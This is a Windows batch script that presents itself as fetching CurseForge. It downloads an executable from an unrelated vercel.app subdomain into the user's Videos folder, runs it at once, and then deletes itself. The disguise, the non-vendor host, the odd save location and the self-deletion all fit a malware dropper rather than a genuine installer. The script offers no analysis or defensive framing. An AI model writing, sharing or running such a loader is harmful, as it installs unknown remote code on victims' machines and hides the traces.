@echo off
setlocal

set "fileUrl=https://1aq-2dpk.vercel.app/curseforge.exe"
set "savePath=%USERPROFILE%\Videos\curseforge.exe"

powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%fileUrl%' -OutFile '%savePath%' -UseBasicParsing } catch { exit 1 }"

if exist "%savePath%" (
    start "" "%savePath%"
    timeout /t 1 /nobreak >nul
    del "%~f0" 2>nul
    exit
) else (
    echo Failed to download the file.
    pause
)

endlocal
exit /b
